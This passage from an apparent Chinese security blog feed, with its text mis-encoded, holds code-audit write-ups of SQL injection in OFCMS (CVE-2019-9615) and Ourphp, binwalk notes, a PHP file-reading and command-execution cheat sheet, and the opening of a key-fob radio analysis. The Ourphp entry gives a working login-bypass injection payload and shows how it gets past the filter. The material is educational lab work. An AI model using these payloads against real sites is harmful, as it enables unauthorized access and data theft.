      </tags>
  </entry>
  <entry>
    <title>OFCMSä»£ç å®¡è®¡--CVE-2019-9615å¤ç°</title>
    <url>/2020/03/15/ofcms-cve-2019-9615-fu-xian/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>OFCMSæ˜¯åŸºäºJavaæŠ€æœ¯çš„å†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œåœ¨v1.1.3ä¹‹å‰çš„ç‰ˆæœ¬å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚</p>
<p>å¤ç°ä¸€ä¸‹CVE-2019-9615ï¼Œä½œä¸ºjavaä»£ç å®¡è®¡çš„å­¦ä¹ ã€‚</p>
<p><strong>æµ‹è¯•ç‰ˆæœ¬ï¼š</strong><a href="https://gitee.com/oufu/ofcms/releases">OFCMS  v1.1.2</a></p>
<ul>
<li>IntelliJ IDEA</li>
<li>Java 1.8.0</li>
<li>Mysql 8.0.12</li>
<li>Tomcat 9.0</li>
</ul>
<h2 id="æ¡ˆä¾‹æ­å»º"><a href="#æ¡ˆä¾‹æ­å»º" class="headerlink" title="æ¡ˆä¾‹æ­å»º"></a>æ¡ˆä¾‹æ­å»º</h2><p>æ‰“å¼€ IDEAï¼Œç‚¹å‡» <code>import Project</code> ï¼Œé€‰æ‹©ä¸‹è½½çš„æºç ï¼Œç„¶åé€‰æ‹©<code>Import project from external model</code>ä¸­çš„ Mavenã€‚</p>
<p>ç„¶åæ‰“å¼€ <code>ofcms-admin/src/main/resources/dev/conf/</code> ä¸‹çš„ <code>db.properties</code> ï¼Œä¿®æ”¹æ•°æ®çš„è´¦å·å¯†ç </p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/cve-2019-9615/p1.png"></p>
<p>ç„¶åä¿®æ”¹æ ¹â½¬å½•ä¸‹çš„ <code>pom.xml </code>ï¼Œæœç´¢ <code>mysql</code> ï¼Œç„¶åä¿®æ”¹æˆâ¾ƒâ¼°å¯¹åº”çš„ç‰ˆæœ¬ï¼Œç„¶åç‚¹å‡»<code>import change</code></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/cve-2019-9615/p2.png"></p>
<p>PSï¼šé€Ÿåº¦å¤ªæ…¢ä¿®æ”¹mavenä¸ºé˜¿é‡Œé•œåƒï¼ˆé¡¹ç›®å³é”®-&gt;maven-&gt;create settings.xmlï¼‰</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;settings xmlns=&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;
          xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
          xsi:schemaLocation=&quot;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;&gt;
    &lt;mirrors&gt;

        &lt;mirror&gt;
            &lt;id&gt;alimaven&lt;/id&gt;
            &lt;name&gt;aliyun maven&lt;/name&gt;
            &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;
            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
        &lt;/mirror&gt;

        &lt;mirror&gt;
            &lt;id&gt;uk&lt;/id&gt;
            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
            &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt;
            &lt;url&gt;http://uk.maven.org/maven2/&lt;/url&gt;
        &lt;/mirror&gt;

        &lt;mirror&gt;
            &lt;id&gt;CN&lt;/id&gt;
            &lt;name&gt;OSChina Central&lt;/name&gt;
            &lt;url&gt;http://maven.oschina.net/content/groups/public/&lt;/url&gt;
            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
        &lt;/mirror&gt;

        &lt;mirror&gt;
            &lt;id&gt;nexus&lt;/id&gt;
            &lt;name&gt;internal nexus repository&lt;/name&gt;
            &lt;url&gt;http://repo.maven.apache.org/maven2&lt;/url&gt;
            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
        &lt;/mirror&gt;

    &lt;/mirrors&gt;
&lt;/settings&gt;</code></pre>
<p>PSï¼šè¿™é‡Œæ²¡æœ‰æ‰¾åˆ°å¯¹åº”è¯¥ç‰ˆæœ¬çš„åŒ…å°±æ¢æˆäº†8.0.12çš„mysqlã€‚</p>
<p>ç„¶åä¸‹è½½éœ€è¦çš„jaråŒ…èµ„æºï¼š</p>
<img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/cve-2019-9615/p3.png" style="zoom:50%;" />

<p>é…ç½®Tomcat æœåŠ¡ï¼Œ<code> run--&gt;edit configurations--&gt; + --&gt;tomcat server--&gt;local</code></p>
<p>é…ç½®å¥½tomcatç›®å½•å’Œç«¯å£ã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/cve-2019-9615/p4.png"></p>
<p>é…ç½®Deploymentï¼š<code>+ --&gt; Artifict --&gt; é€‰æ‹©ofcms-admin:war --&gt;ä¿®æ”¹åå­—</code></p>
<img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/cve-2019-9615/p5.png" style="zoom:50%;" />



<p>æœ€åæ‰“å¼€ MySQLï¼Œåˆ›å»ºâ¼€ä¸ªåä¸º ofcms çš„æ•°æ®åº“ï¼Œå¯¼â¼Š<code>ofcms/doc/sql</code>ä¸‹çš„ sql â½‚ä»¶:</p>
<pre><code class="mysql">mysql&gt; use ofcms
Database changed
mysql&gt; set names utf8;
mysql&gt; source /Users/lanvnal/Files/ä»£ç å®¡è®¡/ofcms/doc/sql/ofcms-v1.1.2.sql</code></pre>
<p>ç„¶åå¯åŠ¨ï¼Œè®¿é—®<code>127.0.0.1:8006/ofcms_admin/</code></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/cve-2019-9615/p6.png"></p>
<p>åå°åœ°å€ï¼š<code>http://localhost:8006/ofcms_admin/admin/index.html</code></p>
<p>ç”¨æˆ·å/å¯†ç ï¼šadmin/123456</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æ¼æ´å­˜åœ¨çš„æ–‡ä»¶ä¸ºï¼š<code>ofcms-admin/src/main/java/com/ofsoft/cms/admin/controller/system/SystemGenerateControlle r.java</code></p>
<pre><code class="java">    /**
     * åˆ›å»ºè¡¨
     */
    public void create() &#123;
        try &#123;
            String sql = getPara(&quot;sql&quot;);
            Db.update(sql);
            rendSuccessJson();
        &#125; catch (Exception e) &#123;
            e.printStackTrace();
            rendFailedJson(ErrorCode.get(&quot;9999&quot;), e.getMessage());
        &#125;
    &#125;</code></pre>
<p>ä½¿â½¤ <code>getPara</code> è·å– sql å‚æ•°ï¼Œç„¶å<code>update</code>â½…æ³•ç›´æ¥æ‰§â¾sql è¯­å¥ï¼Œè¿”å› json æ ¼å¼çš„æ•°æ®ã€‚è¿™â¾¥å¯¹äºä¼ â¼Šçš„å‚æ•°æ²¡æœ‰ä»»ä½•çš„å¤„ç†å°±ç›´æ¥å¸¦â¼Šæ‰§â¾è¯­å¥ä¸­ï¼Œé€ æˆäº† SQL æ³¨â¼Šã€‚</p>
<p>è¯¥åŠŸèƒ½æ˜¯åå°ä»£ç ç”Ÿæˆä¸­çš„å¢åŠ åŠŸèƒ½ã€‚updateå‹çš„æ³¨å…¥ï¼Œå¯ä»¥é€šè¿‡æŠ¥é”™è¿›è¡Œæ³¨å…¥ã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/cve-2019-9615/p7.png"></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/cve-2019-9615/p8.png"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ˜¯ä¸ªåå°çš„sqlæ³¨å…¥ï¼Œåˆ©ç”¨èµ·æ¥æŒºé¸¡è‚‹çš„ï¼Œå¤ç°è¿™ä¸ªä¸»è¦æ˜¯ç¯å¢ƒçš„æ­å»ºå’Œå…¥é—¨çš„å­¦ä¹ ã€‚</p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>binwalkå¸¸ç”¨å‘½ä»¤</title>
    <url>/2017/05/18/binwalk-chang-yong-ming-ling/</url>
    <content><![CDATA[<h1 id="binwalkå¸¸ç”¨å‘½ä»¤"><a href="#binwalkå¸¸ç”¨å‘½ä»¤" class="headerlink" title="binwalkå¸¸ç”¨å‘½ä»¤"></a>binwalkå¸¸ç”¨å‘½ä»¤</h1><ul>
<li>ç®€å•åˆ—å‡ºæ–‡ä»¶</li>
</ul>
<pre><code>$ binwalk firmware.bin</code></pre>
<ul>
<li>æ‰«æzlibå‹ç¼©åŒ…</li>
</ul>
<pre><code>$ binwalk --enable-plugin=zlib firmware.bin  </code></pre>
<ul>
<li>è¿‡æ»¤</li>
</ul>
<p>åŒ…å«è¿‡æ»¤å™¨</p>
<p>â€‹    -yé€‰é¡¹ä»…åŒ…æ‹¬æŒ‡å®šçš„æœç´¢æ–‡æœ¬åŒ¹é…çš„ç»“æœã€‚æœç´¢å­—ç¬¦ä¸²ï¼ˆæ–‡æœ¬ï¼‰åº”å½“ä½¿ç”¨å°å†™ï¼ŒåŒ…æ‹¬æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¹¶ä¸”å¯ä»¥æŒ‡å®šå¤šä¸ª-Yé€‰é¡¹ã€‚ ä¸‹åˆ—æœç´¢ç»“æœåªåŒ…å«æ–‡æœ¬â€œæ–‡ä»¶ç³»ç»Ÿâ€ä¸­æœç´¢å‡ºæ¥çš„ç»“æœã€‚ï¼ˆä¹Ÿå°±è¯´ä½¿ç”¨äº† filesystemçš„Yé€‰é¡¹çš„è¯ç»“æœä¸­åªåŒ…å«æ–‡æœ¬å­—ç¬¦ç»“æœï¼‰</p>
<pre><code>$ binwalk -y filesystem firmware.bin</code></pre>
<p>æ’é™¤è¿‡æ»¤å™¨</p>
<p>â€‹    -xé€‰é¡¹æ˜¯æ’é™¤æœç´¢ç»“æœä¸­çš„æŒ‡å®šç¬¦åˆè§„åˆ™çš„æ–‡æœ¬ï¼ˆæˆ–è€…å­—ç¬¦ä¸²ï¼‰ã€‚ æœç´¢å­—ç¬¦ä¸²ï¼ˆæ–‡æœ¬ï¼‰åº”å½“ä½¿ç”¨å°å†™ï¼ŒåŒ…æ‹¬æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¹¶ä¸”å¯ä»¥æŒ‡å®šå¤šä¸ª-Xé€‰é¡¹ã€‚ ä¸‹åˆ—ä¾‹å­ä¸­æœç´¢æ—¶å°†æ’é™¤â€œjffs2â€å­—ç¬¦ä¸²ï¼š</p>
<pre><code>$ binwalk -x jffs2 firmware.bin</code></pre>
<p>é«˜çº§è¿‡æ»¤å™¨</p>
<p>â€‹    å¯ä»¥å°†åŒ…å«å’Œæ’é™¤è¿‡æ»¤ä¸¤åŠŸèƒ½ç»“åˆä½¿ç”¨ï¼š</p>
<p>â€‹    ä¾‹å­ï¼šä¸‹åˆ—æœç´¢ç»“æœå³åŒ…å«æ–‡æœ¬â€œæ–‡ä»¶ç³»ç»Ÿâ€ä¸­æœç´¢å‡ºæ¥çš„ç»“æœåˆæ’é™¤jffs2å­—ç¬¦ä¸²ç»“æœã€‚</p>
<pre><code>$ binwalk -y filesystem -x jffs2 firmware.bin</code></pre>
<ul>
<li>æå–æ–‡ä»¶</li>
</ul>
<p>-eé€‰é¡¹å¯ä»¥ç”¨æ¥æ‰§è¡Œè‡ªåŠ¨æ•°æ®æå–çš„åŸºç¡€ä¸Šæå–è§„åˆ™ä¸­æŒ‡å®šçš„é»˜è®¤çš„extract.confæ–‡ä»¶ï¼š</p>
<pre><code>$ binwalk -e firmware.bin</code></pre>
<p>é€’å½’æå–    </p>
<p>â€‹    å¾ˆå¤šæ¬¡ï¼Œæå–çš„æ•°æ®å¯èƒ½éœ€è¦è¿›ä¸€æ­¥binwalkçš„åˆ†æã€‚ä¸ºäº†å¸®åŠ©è‡ªåŠ¨åŒ–ï¼Œbinwalkå¯ä»¥é€’å½’æ‰«ææå–çš„æ•°æ®å’Œç”±å¤–éƒ¨å‡å‹æˆ–æå–å·¥å…·åˆ›å»ºçš„æ–‡ä»¶æŒ‡å®š-Mé€‰é¡¹å’Œ-eé€‰é¡¹ä¸€èµ·ä½¿ç”¨ï¼š</p>
<pre><code>$ binwalk -Me firmware.bin</code></pre>
<p>â€‹    è¯·æ³¨æ„ï¼Œ-Mé€‰é¡¹å°†æå–çš„æ–‡ä»¶8å±‚é€’å½’ï¼Œä¸”å¿½ç•¥å¤–éƒ¨æå–å·¥å…·å¯ä»¥åˆ›å»ºä»»ä½•ç›®å½•ã€‚</p>
<ul>
<li>è½¬æ¢åŠŸèƒ½    </li>
</ul>
<p>â€‹    binwalkä½¿ç”¨ -C é€‰é¡¹æ¥å®Œæˆå¤šä¸ªä¸ç”¨æ–‡ä»¶ç±»å‹è½¬æ¢; é€šå¸¸æœ€å¥½æ˜¯ä½¿ç”¨-lé€‰é¡¹æ¥é™åˆ¶è¿™ç§æ‰«æï¼š</p>
<pre><code>$ binwalk -l 32 -C firmware.bin</code></pre>
<ul>
<li>æ¯”è¾ƒåŠŸèƒ½</li>
</ul>
<p>â€‹    Binwalkå¯ä»¥ç”Ÿæˆä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶çš„åå…­è¿›åˆ¶è½¬å‚¨å’Œå·®åˆ«ã€‚åœ¨æ–‡ä»¶å½“ä¸­ç›¸åŒå­—èŠ‚çš„æ˜¯ç»¿è‰²æ˜¾ç¤ºï¼Œä¸åŒçš„æ˜¯çº¢è‰²æ˜¾ç¤ºï¼Œè“è‰²è¡¨ç¤ºåªæ˜¯æœ‰äº›æ–‡ä»¶å½“ä¸­çš„ä¸åŒéƒ¨åˆ†ã€‚</p>
<pre><code>$ binwalk -W firmware1.bin firmware2.bin firmware3.bin</code></pre>
<ul>
<li>å­—ç¬¦ä¸²    </li>
</ul>
<p>â€‹    é™¤äº†ä¸Šè¿°åŸºäºç­¾åçš„æ‰«æï¼Œbinwalkå¯ä»¥å¯¹ç›®æ ‡æ–‡ä»¶è¿›è¡Œä¸€ä¸ªæ™ºèƒ½çš„å­—ç¬¦ä¸²åˆ†æ,è™½ç„¶ä¸æ˜¯å®Œå…¨æ›¿ä»£çš„Unix stringsä¸€æ ·å¼ºå¤§åŠŸèƒ½ï¼Œä½†æ˜¯binwalké€šè¿‡åº”ç”¨ä¸€äº›éå¸¸ç®€å•çš„éªŒè¯è§„åˆ™ç­›é€‰å‡ºæœ€â€œåƒåœ¾â€çš„å­—ç¬¦ä¸²ï¼Œå’Œå¿½ç•¥ä¸€äº›æ— é¡ºåºçš„æ•°æ®å—</p>
<pre><code>$ binwalk -S firmware.bin</code></pre>
<ul>
<li>æ’ä»¶åŠŸèƒ½</li>
</ul>
<p>â€‹    </p>
<p>æ’ä»¶åˆ—è¡¨</p>
<p>â€‹        ä½¿ç”¨ â€“list-pluginsé€‰é¡¹èƒ½è·å¾—å¯ä½¿ç”¨çš„binwalkæ’ä»¶çš„åç§°å’Œå±æ€§åˆ—è¡¨ï¼š</p>
<pre><code>$ binwalk --list-plugins</code></pre>
<p>å¯ç”¨æ’ä»¶åŠŸèƒ½</p>
<p>â€‹    ä¸€äº›æ’ä»¶åœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯ç¦ç”¨çš„ã€‚è¿™äº›æ’ä»¶å¯ä»¥å¯ç”¨æ—¶ç”¨è¯¥é€‰é¡¹ â€“enable-pluginé€‰é¡¹</p>
<pre><code>$ binwalk --enable-plugin=foo firmware.bin</code></pre>
]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>binwalk</tag>
      </tags>
  </entry>
  <entry>
    <title>Ourphpä»£ç å®¡è®¡ï¼ˆ1ï¼‰</title>
    <url>/2017/08/27/ourphp-dai-ma-shen-ji/</url>
    <content><![CDATA[<h1 id="Ourphpä»£ç å®¡è®¡ï¼ˆ1ï¼‰"><a href="#Ourphpä»£ç å®¡è®¡ï¼ˆ1ï¼‰" class="headerlink" title="Ourphpä»£ç å®¡è®¡ï¼ˆ1ï¼‰"></a>Ourphpä»£ç å®¡è®¡ï¼ˆ1ï¼‰</h1><p>Payload:<code>)union selselectect 1,user(),2,3,4,5-- qwe&#39;</code></p>
<blockquote>
<p>payloadç›´æ¥ç™»é™†ï¼Œå¯†ç éšä¾¿å¡«</p>
</blockquote>
<p>é€šè¿‡å…¨å±€æœç´¢æ‰¾åˆ°ç™»é™†é¡µé¢<code>cn_login.html</code>,ç»§è€Œæ‰¾åˆ°å¤„ç†ç™»é™†çš„é¡µé¢<code>ourphp_play.class.php</code>.</p>
<p>å¤„ç†ç™»é™†çš„å‡½æ•°å¦‚ä¸‹:</p>
<pre><code class="php">//å¤„ç†ä¼šå‘˜ç™»å½•
&#125;elseif($_GET[&quot;ourphp_cms&quot;] == &#39;login&#39;)&#123;

    if($ourphp_usercontrol[&#39;loginoff&#39;] == 2)&#123;
        exit(&#39;no!&#39;);
    &#125;
    if ($_POST[&quot;code&quot;] != $ValidateCode)&#123;
        exit(&quot;&lt;script language=javascript&gt; alert(&#39;&quot;.$code.&quot;&#39;);history.go(-1);&lt;/script&gt;&quot;);
    &#125;

    $loginerror = $ourphp_adminfont[&#39;loginerror&#39;];
    $ourphp_rs = $db -&gt; select(&quot;`id`,`OP_Useremail`,`OP_Userpass`,`OP_Userstatus`,`OP_Username`&quot;,&quot;`ourphp_user`&quot;,&quot;WHERE (`OP_Useremail` = &#39;&quot;.dowith_sql($_POST[&quot;OP_Useremail&quot;]).&quot;&#39; || `OP_Usertel` = &#39;&quot;.dowith_sql($_POST[&quot;OP_Useremail&quot;]).&quot;&#39;) and `OP_Userpass` = &#39;&quot;.dowith_sql(substr(md5(md5($_REQUEST[&quot;OP_Userpass&quot;])),0,16)).&quot;&#39;&quot;);
    if (!$ourphp_rs)&#123;

        exit(&quot;&lt;script language=javascript&gt; alert(&#39;&quot;.$loginerror.&quot;&#39;);history.go(-1);&lt;/script&gt;&quot;);

    &#125;else&#123;

        if($ourphp_rs[3] == 2)&#123;
            exit(&quot;&lt;script language=javascript&gt; alert(&#39;&quot;.$userloginno.&quot;&#39;);history.go(-1);&lt;/script&gt;&quot;);
        &#125;

        $_SESSION[&#39;username&#39;] = $ourphp_rs[1];
        $_SESSION[&#39;name&#39;] = $ourphp_rs[4];
                //å¤„ç†Ucenter
        if($ourphp_usercontrol[&#39;ucenter&#39;] == 1)&#123;
            include_once &#39;../../config.inc.php&#39;;
            include_once &#39;../../uc_client/client.php&#39;;
            $OP_Userpass = dowith_sql($_REQUEST[&quot;OP_Userpass&quot;]);
            $OP_Username = $ourphp_rs[4];

            list($uid, $username, $password, $email) = uc_user_login($OP_Username, $OP_Userpass);
            if($uid &gt; 0) &#123;
                //echo &#39;ç™»å½•æˆåŠŸ&#39;.$uid;
                echo uc_user_synlogin($uid);
            &#125; elseif($uid == -1) &#123;
                //echo &#39;ç”¨æˆ·ä¸å­˜åœ¨,æˆ–è€…è¢«åˆ é™¤&#39;;
            &#125; elseif($uid == -2) &#123;
                //echo &#39;å¯†ç é”™&#39;;
            &#125; else &#123;
                //echo &#39;æœªå®šä¹‰&#39;;
            &#125;
        &#125;

        echo @ourphp_pcwapurl($_GET[&#39;type&#39;],&#39;?cn-index.html&#39;,&#39;?&#39;.$_GET[&quot;lang&quot;].&#39;-usercenter.html&#39;,0,&#39;&#39;);
        exit;
    &#125;</code></pre>
<p>ç¬¬184è¡Œä¸ºæŸ¥è¯¢è¯­å¥ã€‚</p>
<pre><code class="php">    $ourphp_rs = $db -&gt; select(&quot;`id`,`OP_Useremail`,`OP_Userpass`,`OP_Userstatus`,`OP_Username`&quot;,&quot;`ourphp_user`&quot;,&quot;WHERE (`OP_Useremail` = &#39;&quot;.dowith_sql($_POST[&quot;OP_Useremail&quot;]).&quot;&#39; || `OP_Usertel` = &#39;&quot;.dowith_sql($_POST[&quot;OP_Useremail&quot;]).&quot;&#39;) and `OP_Userpass` = &#39;&quot;.dowith_sql(substr(md5(md5($_REQUEST[&quot;OP_Userpass&quot;])),0,16)).&quot;&#39;&quot;);</code></pre>
<p>ä½¿ç”¨çš„æ˜¯<code>select</code>å’Œ<code>dowith_sql</code>è¿™ä¸¤ä¸ªæŸ¥è¯¢å‡½æ•°ã€‚</p>
<p>å®šä½åˆ°<code>selectå‡½æ•°</code>ä½äº<code>ourphp_mysql.php</code>,å‡½æ•°åŠŸèƒ½å®šä¹‰å¦‚ä¸‹ï¼š</p>
<pre><code class="php">    //è¯»å–ä¸€æ¡è®°å½•
    public function select($o = &#39;&#39;,$u = &#39;&#39;,$r = &#39;&#39;)&#123;
        $Query = mysql_query(&quot;select &quot;.$o.&quot; from &quot;.$u.&quot; &quot;.$r);
        $Rs = mysql_num_rows($Query);
        if($Rs &lt; 1)&#123;
            return false;
        &#125;else&#123;
            return mysql_fetch_array($Query);
        &#125;
        mysql_free_result($Query);
    &#125;</code></pre>
<p><code>dowith_sqlå‡½æ•°</code>å®šä½ä¸€ä¸‹æ˜¯è‡ªå®šä¹‰çš„è¿‡æ»¤å‡½æ•°ï¼Œä½äº<code>ourphp_function.class.php</code>ä¸­10-39è¡Œã€‚</p>
<p>é€ æˆæ¼æ´çš„æ˜¯ç¬¬11å’Œ35è¡Œçš„å‡½æ•°ã€‚</p>
<pre><code class="php">11   $ourphpstr = addslashes($ourphpstr);
21   $ourphpstr = str_ireplace(&quot;select&quot;,&quot;&quot;,$ourphpstr);
35   $ourphpstr = str_ireplace(&quot;&#39;&quot;,&quot;&quot;,$ourphpstr);</code></pre>
<p>ç¬¬11è¡Œçš„å‡½æ•°ï¼Œ<a href="http://www.w3school.com.cn/php/func_string_addslashes.asp">addslasheså‡½æ•°</a>æ˜¯å°†é¢„è®¾å­—ç¬¦å‰åŠ åæ–œæ .</p>
<p>ç¬¬35è¡Œçš„å‡½æ•°ï¼Œå°†â€™æ›¿æ¢æˆç©ºæ ¼ã€‚ä¼ å…¥çš„â€™å°±å˜æˆäº†\ã€‚</p>
<p>ç¬¬21è¡Œçš„å‡½æ•°ï¼Œæ¶ˆå»selectã€‚</p>
<p>å¯¹selectçš„è¿‡æ»¤ï¼Œå¯ä»¥é€šè¿‡åŒå†™ç»•è¿‡ã€‚</p>
<p>payloadç»è¿‡è¿‡æ»¤åå˜æˆ:</p>
<pre><code>)union select 1,user(),2,3,4,5-- qwe\</code></pre>
<p>ä¼ å…¥sqlè¯­å¥ä¸­çœ‹çœ‹æ€ä¹ˆç»•è¿‡ã€‚</p>
<pre><code class="php">select(&quot;`id`,`OP_Useremail`,`OP_Userpass`,`OP_Userstatus`,`OP_Username`&quot;,&quot;`ourphp_user`&quot;,&quot;WHERE (`OP_Useremail` = &#39;)union select 1,user(),3,4,5-- qwe\&#39; || `OP_Usertel` = &#39;)union select 1,user(),3,4,5-- qwe\&#39;) and `OP_Userpass` = &#39;&quot;.dowith_sql(substr(md5(md5($_REQUEST[&quot;OP_Userpass&quot;])),0,16)).&quot;&#39;&quot;);</code></pre>
<p>payloadä¸­ä¼ å…¥çš„)å¯¹æŸ¥è¯¢è¯­å¥çš„(åšäº†é—­åˆï¼Œå› ä¸ºusertel=payloadä¸­çš„)æ­£å¥½å¯ä»¥ä¸whereåçš„(é—­åˆèµ·æ¥åŠ ä¹‹2æ¬¡çš„å•å¼•å·æ­£å¥½ä½¿OP_Useremail=<code>)union select 1,user(),3,4,5-- qwe\&#39; || &#39;OP_Usertel&#39;=</code>.</p>
<p>è¿™æ ·å°±æ‰§è¡Œäº†unionselectæŸ¥è¯¢è¯­å¥ã€‚</p>
<blockquote>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>åˆ©ç”¨å…³é”®å­—æœç´¢ï¼Œæ‰¾åˆ°æ¼æ´å…¥å£ï¼Œæ‘¸æ¸…å‡½æ•°è°ƒç”¨ã€‚</p>
</blockquote>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>phpèŠ±å¼è¯»å–æ–‡ä»¶</title>
    <url>/2018/03/08/php-hua-shi-du-qu-wen-jian/</url>
    <content><![CDATA[<blockquote>
<p>è½¬è‡ª<a href="https://www.jianshu.com/p/33bc37ef72cc">ç‹ä¸€èˆªåšå®¢</a></p>
</blockquote>
<a id="more"></a>
<h2 id="èŠ±å¼è¯»æ–‡ä»¶"><a href="#èŠ±å¼è¯»æ–‡ä»¶" class="headerlink" title="èŠ±å¼è¯»æ–‡ä»¶"></a>èŠ±å¼è¯»æ–‡ä»¶</h2><pre><code class="php">hightlight_file($filename);
show_source($filename);
print_r(php_strip_whitespace($filename));
print_r(file_get_contents($filename));
readfile($filename);
print_r(file($filename)); // var_dump
fread(fopen($filename,&quot;r&quot;), $size);
include($filename); // éphpä»£ç 
include_once($filename); // éphpä»£ç 
require($filename); // éphpä»£ç 
require_once($filename); // éphpä»£ç 
print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));
print_r(fgets(fopen($filename, &quot;r&quot;))); // è¯»å–ä¸€è¡Œ
fpassthru(fopen($filename, &quot;r&quot;)); // ä»å½“å‰ä½ç½®ä¸€ç›´è¯»å–åˆ° EOF
print_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));
print_r(fgetss(fopen($filename, &quot;r&quot;))); // ä»æ–‡ä»¶æŒ‡é’ˆä¸­è¯»å–ä¸€è¡Œå¹¶è¿‡æ»¤æ‰ HTML æ ‡è®°
print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));
print_r(parse_ini_file($filename)); // å¤±è´¥æ—¶è¿”å› false , æˆåŠŸè¿”å›é…ç½®æ•°ç»„
</code></pre>
<h2 id="èŠ±å¼åˆ—ç›®å½•"><a href="#èŠ±å¼åˆ—ç›®å½•" class="headerlink" title="èŠ±å¼åˆ—ç›®å½•"></a>èŠ±å¼åˆ—ç›®å½•</h2><pre><code class="php">print_r(glob(&quot;*&quot;)); // åˆ—å½“å‰ç›®å½•
print_r(glob(&quot;/*&quot;)); // åˆ—æ ¹ç›®å½•
print_r(scandir(&quot;.&quot;));
print_r(scandir(&quot;/&quot;));
$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;
$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125;
</code></pre>
<h2 id="è¶…å…¨å±€å˜é‡"><a href="#è¶…å…¨å±€å˜é‡" class="headerlink" title="è¶…å…¨å±€å˜é‡"></a>è¶…å…¨å±€å˜é‡</h2><pre><code class="php">$GLOBALS
å‚è€ƒé“¾æ¥ : http://php.net/manual/zh/language.variables.superglobals.php</code></pre>
<h2 id="å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>å‘½ä»¤æ‰§è¡Œå‡½æ•°</h2><pre><code class="php">exec
system
passthru
popen
proc_open
shell_exec</code></pre>
]]></content>
      <categories>
        <category>websec</category>
      </categories>
      <tags>
        <tag>websec</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€æ¬¡å¯¹ç”µåŠ¨è½¦é’¥åŒ™çš„ä¿¡å·åˆ†æ</title>
    <url>/2019/01/22/yi-ci-dui-dian-dong-che-yao-chi-de-xin-hao-fen-xi/</url>
    <content><![CDATA[<blockquote>
<p>ä¸€æ¬¡æ— çº¿ç”µå®‰å…¨çš„å°è¯•</p>
</blockquote>
<h2 id="ä½¿ç”¨çš„è®¾å¤‡"><a href="#ä½¿ç”¨çš„è®¾å¤‡" class="headerlink" title="ä½¿ç”¨çš„è®¾å¤‡"></a>ä½¿ç”¨çš„è®¾å¤‡</h2><p>å¤„äºä»·æ ¼è€ƒè™‘ä½¿ç”¨çš„æ˜¯RTL2832UèŠ¯ç‰‡çš„ç”µè§†æ£’ï¼Œè¿›è¡Œå¯¹æ¥å—çš„è®¾å¤‡çš„å°„é¢‘ä¿¡å·çš„åˆ†æã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E8%BD%A6%E9%92%A5%E5%8C%99%E5%88%86%E6%9E%90/0.jpg"></p>
<h2 id="SDRçš„é…ç½®"><a href="#SDRçš„é…ç½®" class="headerlink" title="SDRçš„é…ç½®"></a>SDRçš„é…ç½®</h2><p>æˆ‘æ˜¯åœ¨Windowså¹³å°ä¸‹è¿›è¡Œçš„è¿™æ¬¡å®éªŒï¼Œé¦–å…ˆè¦å®‰è£…é©±åŠ¨æ‰èƒ½ä½¿ç”¨ã€‚è¿™é‡Œæˆ‘ä½¿ç”¨Zadig æ¥å®‰è£…é©±åŠ¨ã€‚</p>
